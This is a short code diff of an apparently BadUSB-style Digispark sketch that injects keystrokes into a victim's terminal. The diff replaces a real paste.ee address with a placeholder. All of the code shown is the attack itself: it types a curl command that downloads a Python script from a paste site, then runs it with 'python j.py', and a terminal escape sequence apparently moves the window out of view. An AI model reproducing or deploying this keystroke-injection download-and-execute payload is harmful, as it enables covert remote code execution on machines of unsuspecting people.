@@ -12,7 +12,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("printf \'\\e[3;0;0t\'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("curl https://paste.ee/d/Mw6kX -o \"j.py\"");
+  DigiKeyboard.print("curl https://pastbin.com/raw/YOURCODE -o \"j.py\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
   DigiKeyboard.print("python j.py");
